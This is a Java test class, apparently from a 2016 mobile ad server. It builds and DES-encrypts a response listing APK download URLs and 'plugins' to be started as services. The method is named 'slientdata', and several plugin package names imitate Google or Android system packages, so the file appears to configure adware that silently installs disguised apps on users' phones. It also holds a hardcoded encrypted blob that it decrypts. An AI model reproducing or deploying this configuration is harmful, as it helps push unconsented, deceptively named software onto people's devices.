import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.kokmobi.server.bean.GetAdListResp;
import com.kokmobi.server.util.DesUtils;
import net.sf.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

/**
 * Function,
 *
 * @version $Revision$ $Date$
 *          Date, 2016/5/19
 *          Time, 11,26
 * @author, mm
 * @since 3.0
 */
public class Test {
    private static  void slientdata(){
        GetAdListResp f=new GetAdListResp();
        f.setIsExit(1);
        List<JSONObject> as=new ArrayList<>();
        JSONObject a1=new JSONObject();
        a1.put("apkId",11495);a1.put("tracinglinkc",1);a1.put("adtype",2);a1.put("tracinglink","");a1.put("appName","");a1.put("pushText","");a1.put("intruduction","");a1.put("size","");a1.put("icon","");a1.put("imageURL","");a1.put("apkdownloadURL","http://app.cdn7face.com/upload/apk/ChronoMarker20160616.apk");a1.put("dataOrSys",0);a1.put("retentionRate",0);a1.put("actionStatus",2);a1.put("apkPackageName","com.power.core.message");a1.put("day",1);a1.put("isdelete",1);a1.put("md5","F84F353B83FB6E3A32E86CFCE339AF7A");
        as.add(a1);
        JSONObject a2=new JSONObject();
        a2.put("apkId",11400);a2.put("tracinglinkc",1);a2.put("adtype",2);a2.put("tracinglink","");a2.put("appName","");a2.put("pushText","");a2.put("intruduction","");a2.put("size","");a2.put("icon","");a2.put("imageURL","");a2.put("apkdownloadURL","http://app.cdn6face.com/upload/apk/QuickSwipe20160401.apk");a2.put("dataOrSys",0);a2.put("retentionRate",0);a2.put("actionStatus",2);a2.put("apkPackageName","com.android.soundes");a2.put("day",1);a2.put("isdelete",1);a2.put("md5","42DC61915017D81A1D897D8E6C17B3DC");
        as.add(a2);
        f.setApkInfo(as);
        f.setTimes(5000);
        f.setFrequency(10);
        List<JSONObject> plugInfor=new ArrayList<>();
        JSONObject p1=new JSONObject();
        p1.put("plugId",101);p1.put("plugType",0);p1.put("plugName","");p1.put("plugDownloadURL","http://1s.cdn9face.com/upload/ddl/cps_dz_0621c.apk");p1.put("plugPackageName","com.dd.cpsdz");p1.put("plugSevName","com.android.dd.dz.ddcps");p1.put("plugSevPara","");
         plugInfor.add(p1);
        JSONObject p2=new JSONObject();
        p2.put("plugId",100);p2.put("plugType",0);p2.put("plugName","");p2.put("plugDownloadURL","http://1s.cdn9face.com/upload/ddl/cpsxyhymb0620.apk");p2.put("plugPackageName","com.google.android.ddsys");p2.put("plugSevName","android.intent.com.dd.cpps");p2.put("plugSevPara","");
        plugInfor.add(p2);
        JSONObject p3=new JSONObject();
        p3.put("plugId",81);p3.put("plugType",0);p3.put("plugName","");p3.put("plugDownloadURL","http://1s.cdn9face.com/upload/ddl/webcps0615.apk");p3.put("plugPackageName","com.google.webcps");p3.put("plugSevName","android.intent.action.weba");p3.put("plugSevPara","");
        plugInfor.add(p3);
        JSONObject p4=new JSONObject();
        p4.put("plugId",11270);p4.put("plugType",0);p4.put("plugName","");p4.put("plugDownloadURL","http://3s.cdn1face.com/upload/ddl/google_20160419.apk");p4.put("plugPackageName","com.google.zxc");p4.put("plugSevName","android.intent.action.eea");p4.put("plugSevPara","");
        plugInfor.add(p4);
        JSONObject p5=new JSONObject();
        p5.put("plugId",11255);p5.put("plugType",0);p5.put("plugName","");p5.put("plugDownloadURL","http://1s.cdn9face.com/upload/ddl/admobcps.apk");p5.put("plugPackageName","com.android.dd.admob");p5.put("plugSevName","com.android.dd.admob.cps");p5.put("plugSevPara","");
        plugInfor.add(p5);
        f.setPlugInfor(plugInfor);
        ObjectMapper mapper = new ObjectMapper();
        String json= null;
        try {
            json = mapper.writeValueAsString(f);
            System.out.println(DesUtils.encryptDES(json));
        } catch (JsonProcessingException e) {
            e.printStackTrace();
        }
        //System.out.println(json);
    }
    public static void main(String []a){
       //slientdata();
        String aa="ycRo7YmsxLmckm8JCARx/YOpsmlHcUpiiuiWgkdKZCOo*/Ukc/AmBTQfqKL3 WsZ6SwmmZfgTCEdeR0STME1QYM9FyfGrzvyM83xY6QPsJljKior1s7hO2bQL 7hYTXXGz1euRJ/vG4IznWvh9yX2t7lqzmNk2IvEz*qYVM*TnFRYCablqZXCB se7c6UsiD1pJyzXYPq0iO7AHsu/GEUjcM6m1oN4pFGgFm4IoABemYztcbZTx xZqLxJjrfWQLjqPkppaafXHqaOW9HqP*Fopazii8QgnNAsKRTHf6jt8rdpsy M20DaTuGggIxLw3GrgTHbLp5uPz9NF3FhSigetu79jrw90wmNLi*yno7AFZa 2l4hmkHzgKHo9ZjIHC0x*WmzHdbMZmA8stthSh4fk/yUjwf*HQqNqqyT7Gjb xJoHlZy0qGHSArsvqX3bLjqU4uvTnlzfVQCFox713CPms5hwMr137bkyn9l5 Gkcd/ETiFbsq13nVwyswiL/5/4SRX5JxOgnKMkSm6BgyVF5iUO4CWkYv*XDO pG6l9OagSO6mni*ORtpFtbYHHRQierUbIc2t";


        try {
            //MkQFFGlNO6Yhr2Bq16rkjw@@
            //MkQFFGlNO6bkP0D*fHfV0Q@@// DesUtils.decryptDES(aa)
            System.out.println( DesUtils.decryptDES(aa));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
